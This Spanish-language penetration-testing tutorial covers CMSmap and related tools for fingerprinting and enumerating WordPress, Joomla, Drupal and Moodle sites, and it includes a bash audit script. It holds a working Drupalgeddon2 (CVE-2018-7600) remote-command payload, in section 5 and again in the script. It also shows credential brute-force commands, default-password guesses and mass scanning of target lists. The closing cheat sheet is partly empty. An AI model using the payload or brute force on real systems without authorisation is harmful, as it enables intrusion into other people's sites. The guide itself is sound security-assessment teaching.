## CMSmap — el escáner multi-CMS

WPScan es la herramienta perfecta cuando ya sabes que el objetivo usa WordPress. Pero en un engagement real muchas veces llegas a una aplicación web sin saber qué CMS usa, o te encuentras con Joomla, Drupal o Moodle que necesitan herramientas específicas. CMSmap resuelve este problema: es un escáner unificado que detecta automáticamente qué CMS está usando el objetivo y aplica las técnicas de enumeración específicas para ese sistema.

CMSmap fue desarrollado en Python por Dionach y soporta los cuatro CMS más comunes en entornos corporativos y educativos: WordPress, Joomla, Drupal y Moodle. Para cada uno implementa técnicas de enumeración específicas: detección de versión, enumeración de plugins y extensiones instaladas, identificación de usuarios, y cruce con su base de datos de vulnerabilidades conocidas.

Lo que diferencia a CMSmap de simplemente usar WPScan para WordPress y herramientas separadas para el resto es la **detección automática del CMS**. En reconocimiento real, a menudo no sabes de antemano qué gestor de contenidos usa un sitio, y CMSmap puede identificarlo y auditarlo en un solo paso. Esto lo hace especialmente valioso cuando tienes una lista larga de objetivos web y necesitas procesar todos con mínima intervención manual.

## 1. Instalación

```bash
# Clonar desde el repositorio oficial
git clone https://github.com/dionach/CMSmap.git
cd CMSmap
pip3 install -r requirements.txt

# Alternativa con pip
pip3 install cmsmap

# En Kali Linux — disponible en repositorios
sudo apt install cmsmap

# Verificar instalación
python3 cmsmap.py --help
# o si está en el PATH:
cmsmap --help

# Actualizar la base de datos de vulnerabilidades
cmsmap --update a   # Actualizar todo
cmsmap --update w   # Solo WordPress
cmsmap --update j   # Solo Joomla
cmsmap --update d   # Solo Drupal
cmsmap --update m   # Solo Moodle
```

## 2. Detección automática de CMS

La característica más importante de CMSmap es que identifica el CMS antes de iniciar la enumeración. Esto evita tener que determinar manualmente qué herramienta usar para cada objetivo:

```bash
# Escaneo básico — CMSmap detecta el CMS automáticamente
cmsmap https://target.com

# El proceso de detección comprueba:
# 1. Cabeceras HTTP características de cada CMS
# 2. Rutas específicas de cada CMS (/wp-login.php, /administrator/, etc.)
# 3. Meta tags en el HTML
# 4. Estructura de URLs y recursos estáticos
# 5. Cookies específicas del CMS

# Una vez detectado el CMS, aplica automáticamente las técnicas
# de enumeración específicas para ese sistema

# Forzar escaneo para un CMS específico (cuando ya lo sabes)
cmsmap -f W https://target.com    # Forzar WordPress
cmsmap -f J https://target.com    # Forzar Joomla
cmsmap -f D https://target.com    # Forzar Drupal
cmsmap -f M https://target.com    # Forzar Moodle

# HTTPS con certificado autofirmado
cmsmap https://target.com -k

# Guardar resultados
cmsmap https://target.com -o resultados.txt

# Modo verbose para ver qué está haciendo
cmsmap https://target.com -v
```

## 3. Enumeración en WordPress con CMSmap

Cuando CMSmap detecta WordPress, ejecuta estas comprobaciones automáticamente:

```bash
# Escaneo WordPress completo
cmsmap -f W https://wordpress-target.com

# Lo que CMSmap comprueba en WordPress:
# - Versión de WordPress (desde readme.html, meta generator, RSS)
# - Plugins activos y sus versiones
# - Temas activo y alternativos
# - Usuarios (vía REST API y author enumeration)
# - xmlrpc.php accesible
# - readme.html accesible
# - Ficheros de backup de wp-config
# - Vulnerabilidades en versión, plugins y temas

# Con mayor profundidad de escaneo
cmsmap -f W https://target.com --fullscan

# Escanear con credenciales (si tienes acceso al panel admin)
cmsmap -f W https://target.com -u admin -p contraseña

# Fuerza bruta de credenciales
cmsmap -f W https://target.com -U usuarios.txt -P passwords.txt
```

## 4. Enumeración en Joomla

Joomla es el segundo CMS más popular y tiene una superficie de ataque muy diferente a WordPress. CMSmap implementa las técnicas específicas de Joomla:

```bash
# Escaneo Joomla completo
cmsmap -f J https://joomla-target.com

# Qué enumera CMSmap en Joomla:
# - Versión de Joomla (desde /administrator/manifests/files/joomla.xml)
# - Componentes instalados (/components/, /administrator/components/)
# - Módulos y plugins
# - Usuarios del sistema
# - Panel de administración en /administrator/
# - Ficheros de configuración expuestos
# - Vulnerabilidades en la versión y extensiones detectadas

# Rutas de interés en Joomla que CMSmap verifica:
# /administrator/           → Panel de administración
# /configuration.php        → Configuración (nunca debe ser legible)
# /administrator/manifests/files/joomla.xml → Versión exacta
# /language/en-GB/en-GB.xml → Versión alternativa
# /components/              → Componentes instalados
# /plugins/                 → Plugins instalados
# /templates/               → Templates instalados
```

### Estructura de ataque en Joomla

```bash
# Una vez CMSmap identifica la versión y componentes:

# 1. Buscar vulnerabilidades en SearchSploit
searchsploit joomla 3.9
searchsploit joomla com_content   # Componente específico

# 2. Verificar ficheros de configuración expuestos manualmente
curl -s https://target.com/configuration.php
# Si devuelve código PHP en lugar de error → configuración expuesta

# 3. Enumerar usuarios vía API de Joomla
curl -s "https://target.com/api/v1/users" | python3 -m json.tool

# 4. Panel de administración
# /administrator/ → login de Joomla
# Credenciales por defecto a probar: admin/admin, admin/password
```

## 5. Enumeración en Drupal

Drupal es el CMS preferido de gobiernos, universidades y grandes organizaciones por su robustez y flexibilidad. Sin embargo, tiene vulnerabilidades históricas muy graves — Drupalgeddon (SA-CORE-2018-002) y Drupalgeddon2 (CVE-2018-7600) permitieron RCE sin autenticación en millones de sitios.

```bash
# Escaneo Drupal completo
cmsmap -f D https://drupal-target.com

# Qué enumera CMSmap en Drupal:
# - Versión de Drupal (CHANGELOG.txt en versiones antiguas, core/CHANGELOG.txt en Drupal 8+)
# - Módulos contrib instalados
# - Usuarios (si user enumeration está habilitada)
# - Panel de administración en /admin/
# - Drupal services endpoint si está configurado

# Detección de versión manual (complementar CMSmap)
curl -s https://target.com/CHANGELOG.txt | head -5        # Drupal 6/7
curl -s https://target.com/core/CHANGELOG.txt | head -5   # Drupal 8+
curl -s https://target.com/core/includes/bootstrap.inc \
    | grep "define.*VERSION"

# Verificar Drupalgeddon2 (CVE-2018-7600) — RCE sin autenticación
# Una de las vulnerabilidades más graves de la historia de CMS
# Afecta Drupal 7.x < 7.58 y 8.x < 8.5.1
curl -s "https://target.com/?q=user/password&name[%23post_render][]=passthru&name[%23markup]=id&name[%23type]=markup" \
    | grep -E "uid=[0-9]"
# Si devuelve algo como uid=33(www-data) → VULNERABLE

# Módulos contrib de Drupal en rutas conocidas
curl -s https://target.com/sites/all/modules/ | grep -oP 'href="[^"]*/"' | head -20
```

## 6. Enumeración en Moodle

Moodle es el LMS (Learning Management System) más usado en universidades y centros educativos. Aunque menos conocido que WordPress en el contexto del pentesting, es un objetivo muy frecuente en auditorías de instituciones educativas y corporativas.

```bash
# Escaneo Moodle completo
cmsmap -f M https://moodle-target.com

# Qué enumera CMSmap en Moodle:
# - Versión de Moodle
# - Plugins instalados
# - Usuarios registrados (si el registro es público)
# - Cursos disponibles públicamente
# - Endpoint de la API REST si está habilitada

# Detección de versión de Moodle
curl -s https://target.com/lib/upgrade.txt | head -10
curl -s https://target.com/version.php   # A veces accesible
curl -s "https://target.com/login/index.php" | grep -i "moodle"

# Enumerar cursos públicos
curl -s "https://target.com/course/index.php" | grep -oP 'course/view\.php\?id=\d+'

# API REST de Moodle (si está habilitada)
curl -s "https://target.com/webservice/rest/server.php" \
    --data "wsfunction=core_webservice_get_site_info&moodlewsrestformat=json"

# Usuarios en Moodle — si el registro público está habilitado
curl -s "https://target.com/user/index.php?courseid=1" | grep -oP 'user/view\.php\?id=\d+'
```

## 7. Escaneo masivo de múltiples objetivos

Una de las ventajas más prácticas de CMSmap es la capacidad de procesar múltiples objetivos automáticamente:

```bash
# Escanear múltiples URLs desde un fichero
cmsmap -i urls_objetivo.txt -o resultados_masivo.txt

# El fichero de URLs tiene una URL por línea:
# https://target1.com
# https://target2.com
# https://intranet.empresa.com/cms/
# https://blog.empresa.com

# Procesar la lista de subdominios activos encontrados con subfinder/amass
cat subdominios_activos.txt | grep -E "^https?://" > urls_para_cmsmap.txt
cmsmap -i urls_para_cmsmap.txt -o cms_resultados.txt

# Combinando con httpx para verificar primero que los sitios están activos
cat subdominios.txt | httpx -silent -o sitios_activos.txt
cmsmap -i sitios_activos.txt -o cms_audit.txt

# Script para procesar resultados y extraer los más críticos
python3 << 'EOF'
import re

with open("cms_resultados.txt") as f:
    content = f.read()

# Buscar vulnerabilidades críticas en el output
critical_patterns = [
    r"CRITICAL.*",
    r"HIGH.*",
    r"RCE.*",
    r"Remote Code Execution.*",
    r"SQL Injection.*",
    r"File Upload.*",
    r"Authentication Bypass.*"
]

print("[!] HALLAZGOS CRÍTICOS:")
for line in content.split("\n"):
    for pattern in critical_patterns:
        if re.search(pattern, line, re.IGNORECASE):
            print(f"  {line.strip()}")
            break
EOF
```

## 8. Comparativa de herramientas por CMS

Para elegir la herramienta más adecuada según el CMS detectado:

```
WORDPRESS:
├── WPScan      → Primera opción. Base de datos WPVulnDB, muy preciso
├── CMSmap      → Buena alternativa, útil cuando se combina con otros CMS
└── Nikto       → Complemento para vulnerabilidades genéricas del servidor

JOOMLA:
├── CMSmap      → Primera opción para Joomla
├── JoomScan    → Especializado en Joomla, más completo que CMSmap
│   └── git clone https://github.com/OWASP/joomscan
│       perl joomscan.pl -u https://target.com
└── Droopescan  → También soporta Joomla

DRUPAL:
├── CMSmap      → Primera opción básica
├── Droopescan  → Más completo para Drupal
│   └── pip3 install droopescan
│       droopescan scan drupal -u https://target.com
└── DrupalGeddon scanner → Para CVE-2018-7600 específicamente

MOODLE:
├── CMSmap      → Primera opción para Moodle
└── Comprobaciones manuales de API REST

GENÉRICO (CMS desconocido):
├── CMSmap      → Detección automática y escaneo
├── WhatWeb     → Fingerprinting más detallado
└── Nikto       → Vulnerabilidades genéricas del servidor web
```

## 9. Flujo completo de auditoría CMS

```bash
#!/bin/bash
# cms_audit.sh — Auditoría completa de CMS con detección automática
# Uso: ./cms_audit.sh https://target.com

TARGET=$1
OUTDIR="./cms_audit_$(echo $TARGET | sed 's|https\?://||;s|/|_|g')"
mkdir -p "$OUTDIR"

if [ -z "$TARGET" ]; then
    echo "Uso: $0 <URL>"
    exit 1
fi

echo "╔══════════════════════════════════════════╗"
echo "  Auditoría CMS: $TARGET"
echo "╚══════════════════════════════════════════╝"

# ── FASE 1: FINGERPRINTING ────────────────────────────────────────────
echo ""
echo "[1/4] Identificando CMS con WhatWeb..."
whatweb -a 3 "$TARGET" 2>/dev/null | tee "$OUTDIR/01_whatweb.txt"

# Detectar CMS del output de WhatWeb
CMS="unknown"
if grep -qi "wordpress" "$OUTDIR/01_whatweb.txt"; then
    CMS="wordpress"
elif grep -qi "joomla" "$OUTDIR/01_whatweb.txt"; then
    CMS="joomla"
elif grep -qi "drupal" "$OUTDIR/01_whatweb.txt"; then
    CMS="drupal"
elif grep -qi "moodle" "$OUTDIR/01_whatweb.txt"; then
    CMS="moodle"
fi
echo "  CMS detectado: $CMS"

# ── FASE 2: CMSMAP ────────────────────────────────────────────────────
echo ""
echo "[2/4] CMSmap — enumeración y vulnerabilidades..."
cmsmap "$TARGET" -o "$OUTDIR/02_cmsmap.txt" 2>/dev/null
echo "  Completado. Hallazgos:"
grep -iE "vulnerable|critical|high|found" "$OUTDIR/02_cmsmap.txt" | head -20

# ── FASE 3: HERRAMIENTA ESPECÍFICA DEL CMS ───────────────────────────
echo ""
echo "[3/4] Herramienta específica para $CMS..."

case "$CMS" in
    wordpress)
        echo "  Usando WPScan..."
        wpscan --url "$TARGET" \
            --enumerate u,vp,vt,cb \
            --plugins-detection aggressive \
            --disable-tls-checks \
            --no-banner \
            -o "$OUTDIR/03_wpscan.txt" 2>/dev/null
        ;;
    joomla)
        echo "  Usando JoomScan..."
        if command -v joomscan &>/dev/null; then
            joomscan -u "$TARGET" -ec 2>/dev/null \
                | tee "$OUTDIR/03_joomscan.txt"
        else
            echo "  JoomScan no disponible, usando solo CMSmap"
        fi
        ;;
    drupal)
        echo "  Usando Droopescan..."
        if command -v droopescan &>/dev/null; then
            droopescan scan drupal -u "$TARGET" \
                2>/dev/null | tee "$OUTDIR/03_droopescan.txt"
        else
            echo "  Droopescan no disponible"
            # Verificar Drupalgeddon manualmente
            echo "  Verificando Drupalgeddon2 (CVE-2018-7600)..."
            RESULT=$(curl -s "${TARGET}/?q=user/password&name[%23post_render][]=passthru&name[%23markup]=id&name[%23type]=markup" | grep -E "uid=[0-9]")
            [ -n "$RESULT" ] && echo "  [CRÍTICO] DRUPALGEDDON2 DETECTADO: $RESULT"
        fi
        ;;
    *)
        echo "  CMS no identificado, usando Nikto para comprobaciones genéricas..."
        nikto -h "$TARGET" -o "$OUTDIR/03_nikto.txt" 2>/dev/null
        ;;
esac

# ── FASE 4: BUSCAR EXPLOITS ───────────────────────────────────────────
echo ""
echo "[4/4] Buscando exploits para tecnologías detectadas..."

# Extraer versiones del output de WhatWeb
VERSIONS=$(grep -oP "[A-Za-z]+\[[0-9]+\.[0-9]+[^\]]*\]" "$OUTDIR/01_whatweb.txt" | head -10)
echo "$VERSIONS" | while read tech_ver; do
    tech=$(echo "$tech_ver" | cut -d'[' -f1)
    ver=$(echo "$tech_ver" | grep -oP "[0-9]+\.[0-9]+[^]]*")
    if [ -n "$tech" ] && [ -n "$ver" ]; then
        COUNT=$(searchsploit "$tech $ver" 2>/dev/null | grep -c "Exploit")
        [ "$COUNT" -gt 0 ] && echo "  [!] $tech $ver → $COUNT exploits en SearchSploit"
    fi
done

echo ""
echo "╔══════════════════════════════════════════╗"
echo "  AUDITORÍA COMPLETADA"
echo "╠══════════════════════════════════════════╣"
echo "  CMS:         $CMS"
echo "  Resultados:  $OUTDIR/"
echo "╚══════════════════════════════════════════╝"
```

```bash

cmsmap -f D https://target.com              # Forzar Drupal
cmsmap -f M https://target.com              # Forzar Moodle

cmsmap https://target.com -k                # Ignorar SSL

# ── HERRAMIENTAS ESPECÍFICAS POR CMS ─────────────────────────────────────
# WordPress
wpscan --url https://target.com --enumerate u,vp,vt --api-token KEY

# Joomla

# git clone https://github.com/OWASP/joomscan && perl joomscan.pl -u URL

# Drupal
droopescan scan drupal -u https://target.com
# pip3 install droopescan

# Moodle
# CMSmap es la principal herramienta
# Complementar con revisión manual de la API REST

# ── DETECCIÓN MANUAL POR CMS ──────────────────────────────────────────────
# WordPress:  curl -s https://target/wp-login.php | grep -i wordpress
# Joomla:     curl -s https://target/administrator/ | grep -i joomla
# Drupal:     curl -s https://target/CHANGELOG.txt | head -3
# Moodle:     curl -s https://target/login/ | grep -i moodle

# ── VERSIONES ESPECÍFICAS ─────────────────────────────────────────────────
# WordPress: /readme.html, /wp-json, meta generator
# Joomla:    /administrator/manifests/files/joomla.xml
# Drupal:    /CHANGELOG.txt (D7), /core/CHANGELOG.txt (D8+)
# Moodle:    /lib/upgrade.txt

# ── BUSCAR EXPLOITS ───────────────────────────────────────────────────────

# ── RECURSOS ──────────────────────────────────────────────────────────────
```
